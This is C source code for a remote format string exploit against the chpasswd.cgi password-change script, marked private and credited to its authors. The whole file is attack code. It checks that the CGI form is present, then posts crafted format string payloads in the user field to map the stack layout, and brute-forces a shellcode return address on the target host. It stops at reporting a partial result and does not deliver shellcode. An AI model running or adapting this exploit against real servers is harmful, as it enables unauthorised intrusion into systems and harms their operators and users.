/*
 * Proof of concept chpasswd.cgi remote format string exploit
 * by skylazart/dm_
 * 28/11/2008
 *
 * PRIVATE -*- PRIVATE -*- PRIVATE -*- PRIVATE
 */


#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include "net.h"


#define DEFAULT_CHPASSWD_CGI_PATH "/cgi-bin/chpasswd.cgi"
#define DEFAULT_HTTP_PORT 80

#define SCAN_TIMEOUT 5



inline void
print_result_as_ascii (char * result)
{
	char * ptr;
	int i;

	ptr = NULL;
	ptr = strstr (result, "<font color=red size=+2>");
	
	if (ptr == NULL) {
		ptr = result;
	}

	for (i = 0; i < strlen (result); i++) {
		if (isprint (ptr[i])) {
			printf ("%c", ptr[i]);
		}
	}
	printf ("\n");
}

int
check_cgi (char * ip, int port, char * cgi_path)
{
	char buffer[128];
	char outbuffer[8192];
	int fd;
	int n;


	fd = net_tcp_nonblock_connect (ip, port, SCAN_TIMEOUT);
	if (fd <= 0) {		
		close (fd);
		return (-1);
	}

	snprintf (buffer, sizeof (buffer)-1, 
		  "GET %s HTTP/1.0\r\n"
		  "Host:%s\r\n\r\n", cgi_path, ip);


	n = write (fd, buffer, strlen (buffer));
	if (n <= 0) {
		close (fd);
		return (-1);
	}

	memset (buffer, 0, sizeof (buffer));       
	while (1) {
		if (!net_has_data (fd, SCAN_TIMEOUT)) {
			break;
		}
		n = read (fd, buffer, sizeof (buffer));
		if (n <= 0) {
			break;
		}
		strncat (outbuffer, buffer, sizeof (outbuffer)-1);
	}

	close (fd);
	if (strlen (outbuffer) == 0) {
		return (-1);
	}

	if (strstr (outbuffer, "name=user") != NULL && 
	    strstr (outbuffer, "name=old_pw") != NULL &&
	    strstr (outbuffer, "name=new_pw") != NULL) {
		return (1);
	}

	return (0);
}


void
find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long addr)
{
	int fill_size;
	char * ptr;
	int i;

	strncat (buffer, "user=", maxlen);

	for (i = 0; i < align; i++) {
		strncat (buffer, "S", maxlen);
	}

	ptr = &buffer[strlen (buffer)];
	memcpy (ptr, &addr, sizeof (addr));
	ptr[4] = '\0';

	for (i = 0; i < stack_height; i++) {
		strncat (buffer, ".%08x", maxlen);
	}

	strncat (buffer, "|%s|", maxlen);
	
	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha&", maxlen);

	fill_size = 1022 - strlen (buffer);
	for (i = 0; i < (fill_size/4); i++) {
		strncat (buffer, "AAAA", maxlen);
	}	

	//i = write (1, buffer, strlen (buffer));
}

void
find_stack_distance (char *buffer, int maxlen, int align, int stack_height)
{	
	int i;

	strncat (buffer, "user=", maxlen);

	for (i = 0; i < align; i++) {
		strncat (buffer, "S", maxlen);
	}

	strncat (buffer, "AAAA", maxlen); 

	for (i = 0; i < stack_height; i++) {
		strncat (buffer, ".%08x", maxlen);
	}

	strncat (buffer, "|%08x|", maxlen);
	
	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha", maxlen);
}

int
post_chpasswd_user (char *ip, int port, char * cgi_path, char * user, 
		    char * outbuffer, int maxlen)
{
	char tmp[8192];
	int fd;
	int n;
	int tot_out_len;

	fd = net_tcp_nonblock_connect (ip, port, 60);
	 if (fd < 0) {
		 return (-1);
	 }

	 snprintf (tmp, sizeof (tmp), 
		   "POST %s HTTP/1.0\r\n"
		  "Host:%s\r\n"
		  "Content-Length: %d\r\n"
		  "\r\n"
		  "%s\r\n\r\n", cgi_path, ip, strlen (user), user);

	n = write (fd, tmp, strlen (tmp));
	if (n <= 0) {
		close (fd);
		return (-1);
	}


	memset (tmp, 0, sizeof (tmp));

	tot_out_len = 0;
	do {
		if (!net_has_data (fd, 10)) {
			break;
		}
		n = read (fd, tmp, sizeof (tmp)-1);
		if (n == 0) {
			break;
		}
		
		tot_out_len += n;
		strncat (outbuffer, tmp, maxlen);
	} while (1);

	close (fd);

	return (tot_out_len);
}


int
main (int argc, char ** argv)
{
	char * host = NULL;
	int port = 0;
	char * cgi_path = NULL;


	char buffer[8192];
	char result[8192];
	char * ptr;

	int align = 0;
	int stack_height = 1;
	
	int found;

	unsigned int expect_shellcode_addr = 0xbfffffff;
	int step = -128;

	int shellcode_addr_found;

	int total_shellcode_addr_retries;

	
	puts ("Proof of concept chpasswd.cgi remote format string exploit");
	puts ("by skylazart/dm_ - BufferOverflow & xored");
	puts ("28/11/2008");
	puts ("");

	if (argc < 2) {
		printf ("%s <host> [port] [cgi_path] [return address] [step]\n", argv[0]);
		exit (1);
	}

	host = argv[1];
	if (argc >= 3) {
		port = atoi (argv[2]);
	}

	if (argc >= 4) {
		cgi_path = argv[3];
	}

	if (argc >= 5) { 
		expect_shellcode_addr = strtoul (argv[4], NULL, 16);
	}

	if (argc >= 6) {
		step = atoi (argv[5]);
	}

	if (port == 0) {
		port = DEFAULT_HTTP_PORT;
	}

	if (cgi_path == NULL) {
		cgi_path = DEFAULT_CHPASSWD_CGI_PATH;
	}


	printf (">> Checking CGI script...\n");

	if (check_cgi (host, port, cgi_path) != 1) {
		exit (1);
	}

	printf ("Host %s:%d/%s ok\n", host, port, cgi_path);


	printf (">> Finding stack_height and alignment...\n");


	found = 0;
	do {
		memset (buffer, 0, sizeof (buffer));
		memset (result, 0, sizeof (result));

		find_stack_distance (buffer, sizeof (buffer)-2, align, 
				     stack_height);

		post_chpasswd_user (host, port, cgi_path, 
				    buffer, result, sizeof (result)-2);

		

		print_result_as_ascii (result);
		printf (">> %s\n", host);

		
		ptr = strstr (result, "AAAA.");
		if (ptr == NULL) {
			stack_height++;
			continue;
		}

		if (strstr (result, "|41414141|")) {
			found = 1;
			break;
		}

		if (strstr (result, "|414141")) {
			align++;
			continue;
		}

		if (strstr (result, "|4141")) {
			align += 2;
			continue;
		}

		if (strstr (result, "|41")) {
			align += 3;
			continue;
		}
		
		stack_height++;


		if (stack_height > 20) {
			break;
		}
	} while (found == 0);
		

	if (found == 1) {
		printf (">> Found Host = %s stack_height = %d align = %d\n", host, stack_height, align);
	}
       	

//	expect_shellcode_addr = 0xbf9f7601;
//	expect_shellcode_addr = 0xbfa08301;
//	expect_shellcode_addr = 0xbff0f7fc & 0xffff0000;
//	expect_shellcode_addr = 0xbfbafdd5 & 0xffff0000;
//	expect_shellcode_addr = 0xb7fc5d68 & 0xffff0000;
//
//	expect_shellcode_addr = 0xbfffffff;


	shellcode_addr_found = 0;
	total_shellcode_addr_retries = 0;
	found = 0;

	do {
		if ((expect_shellcode_addr & 0xff000000) >>24 == 0 ||
		    (expect_shellcode_addr & 0x00ff0000) >>16 == 0 ||
		    (expect_shellcode_addr & 0x0000ff00) >> 8 == 0 ||
		    (expect_shellcode_addr & 0x000000FF)      == 0) {
			printf (">> Skipping address 0x%08x\n", expect_shellcode_addr);
			expect_shellcode_addr++;
			continue;
		}

		memset (buffer, 0, sizeof (buffer));
		memset (result, 0, sizeof (result));


		fprintf (stderr, "\r>> Trying 0x%08x, [%d] steps.", expect_shellcode_addr, ++total_shellcode_addr_retries);
		
		find_shellcode_addr (buffer, sizeof (buffer)-2, align, stack_height, expect_shellcode_addr);

		post_chpasswd_user (host, port, cgi_path, 
				    buffer, result, sizeof (result)-2);


		if (!strstr (result, "Internal Server Error")) {
			printf ("\n");
			print_result_as_ascii (result);
			printf ("\n");

			if (strstr (result, "|AAA")) {
				printf (">> &Shellcode found: %s shellcode address: 0x%08x\n", host, expect_shellcode_addr);
				
				shellcode_addr_found ++;
				sleep (1);

				if (shellcode_addr_found == 2) {
					break;
				}

				printf (">> Double checking...\n");
				continue;
			}
		}
		
		expect_shellcode_addr = expect_shellcode_addr + step;
	} while (!found);
		 
	
	printf ("\n\n");
	printf (">> Partial exploit result:\n");
	printf (">> Host address %s: stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);

	
	return (0);
}
